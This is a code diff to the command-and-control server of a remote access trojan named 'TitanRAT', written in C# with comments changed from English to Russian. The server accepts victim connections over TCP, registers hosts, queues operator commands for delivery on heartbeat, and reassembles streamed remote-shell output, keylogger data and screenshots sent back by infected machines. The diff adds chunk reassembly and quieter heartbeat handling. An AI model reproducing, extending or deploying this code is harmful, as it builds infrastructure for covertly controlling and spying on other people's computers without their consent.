@@ -1,15 +1,21 @@
 // Server/Program.cs
+using TitanRAT.Server;
 using System.Net;
 using System.Net.Sockets;
 using System.Collections.Concurrent;
 using System.Text;
 using System.Text.Json;
-using TitanRAT.Server;
 using System.Text.Json.Serialization;
 
 class Program
 {
+    // Реассемблер сообщений (чанки + потоковая агрегация)
+    private static readonly MessageReassembler _reassembler = new();
+    
+    // Сессии клиентов
     private static readonly ConcurrentDictionary<string, ClientSession> _clients = new();
+    
+    // Флаги и настройки
     private static volatile bool _running = true;
     private const int TcpPort = 12345;
     private const int HttpPort = 12346;
@@ -20,18 +26,18 @@ class Program
         Console.WriteLine($"[C2] Starting TCP server on port {TcpPort}...");
         Console.WriteLine($"[C2] Starting HTTP API on port {HttpPort}...");
         
-        // Start TCP listener
+        // Запуск TCP-слушателя
         var tcpListener = new TcpListener(IPAddress.Any, TcpPort);
         tcpListener.Start();
         var tcpTask = Task.Run(() => AcceptTcpClientsAsync(tcpListener));
         
-        // Start HTTP API
+        // Запуск HTTP API
         var httpTask = Task.Run(() => RunHttpApiAsync(_httpCts.Token));
         
-        // Console input loop
+        // Консоль оператора
         await HandleConsoleInputAsync();
         
-        // Shutdown
+        // Корректное завершение
         _running = false;
         _httpCts.Cancel();
         tcpListener.Stop();
@@ -59,12 +65,12 @@ class Program
         
         try
         {
-            // Handshake: HELLO
+            // Рукопожатие: HELLO
             line = await session.ReadLineAsync();
             if (line != "HELLO") { session.Close(); return; }
             await session.SendCommandAsync("ACK");
             
-            // Registration: REGISTER:hostname
+            // Регистрация: REGISTER:hostname
             line = await session.ReadLineAsync();
             if (line?.StartsWith("REGISTER:") != true) { session.Close(); return; }
             
@@ -74,15 +80,19 @@ class Program
             
             await session.SendCommandAsync($"ID:{session.Id}");
             
-            // Main loop
+            // Главный цикл обработки
             while (_running)
             {
                 line = await session.ReadLineAsync();
                 if (line == null) break;
+
+                // Игнорируем пустые строки
+                if (string.IsNullOrWhiteSpace(line)) continue; 
                 
                 session.LastSeen = DateTime.UtcNow;
 
-                if (line.StartsWith("BEAT:"))
+                // Обработка хартбитов (pong / BEAT:id) — "тихо", без вывода в консоль
+                if (line.StartsWith("BEAT:") || line == "pong")
                 {
                     var cmd = session.GetPendingCommand();
                     if (cmd != null)
@@ -90,16 +100,36 @@ class Program
                         Console.WriteLine($"[>] Sending queued command to {session.Id}: {cmd}");
                         await session.SendCommandAsync(cmd);
                     }
-                    else
-                    {
-                        // FIX: Send 'ping' to keep connection alive without errors
-                        await session.SendCommandAsync("ping");
-                    }
+                    // Если команд нет — просто игнорируем хартбит
                 }
                 else
                 {
+                    // Сохраняем ответ в историю сессии
                     session.AddResponse(line);
-                    Console.WriteLine($"[RESPONSE] {session.Id}: {line}");
+                    
+                    // Пропускаем через реассемблер (чанки + потоковая агрегация)
+                    var assembled = _reassembler.Process(session.Id, line);
+                    
+                    if (assembled != null)
+                    {
+                        // Убираем технический префикс для чистого терминального вывода
+                        string displayMsg = assembled;
+                        if (displayMsg.StartsWith("SHELL_OUT:"))
+                            displayMsg = displayMsg.Substring(10); // Remove "SHELL_OUT:"
+                            
+                        Console.WriteLine($"[RESPONSE] {session.Id}: {displayMsg}");
+                    }
+                    
+                    // Если пришло сообщение НЕ от шелла — сбрасываем буфер шелла (если он "завис")
+                    // Это нужно, если оператор переключился на другую команду, а шелл ещё не закончил
+                    if (!line.StartsWith("SHELL_OUT") && !line.StartsWith("KEYLOG") && !line.StartsWith("SCREENSHOT"))
+                    {
+                        var flushed = _reassembler.FlushStream(session.Id, "SHELL_OUT");
+                        if (flushed != null && flushed.StartsWith("SHELL_OUT:"))
+                        {
+                            Console.WriteLine($"[RESPONSE] {session.Id}: {flushed.Substring(10)}");
+                        }
+                    }
                 }
             }
         }
@@ -119,8 +149,6 @@ class Program
     {
         var listener = new HttpListener();
     
-        // Добавляем оба префикса: localhost И 127.0.0.1
-        // Для продакшена можно добавить: $"http://+:{HttpPort}/" (требует админ-прав)
         listener.Prefixes.Add($"http://localhost:{HttpPort}/");
         listener.Prefixes.Add($"http://127.0.0.1:{HttpPort}/");
     
@@ -140,6 +168,7 @@ class Program
             listener.Stop();
         }
     }
+    
     private static async Task HandleHttpRequestAsync(HttpListenerContext context)
     {
         var request = context.Request;
@@ -274,7 +303,6 @@ class Program
                     if (_clients.TryGetValue(parts[1], out var qSession))
                     {
                         Console.WriteLine($"\n[Queue for {parts[1]}] (size: {qSession.QueueSize})");
-                        // Note: ConcurrentQueue doesn't allow enumeration, so we just show size
                         Console.WriteLine("(Commands are delivered on next heartbeat)");
                     }
                     else
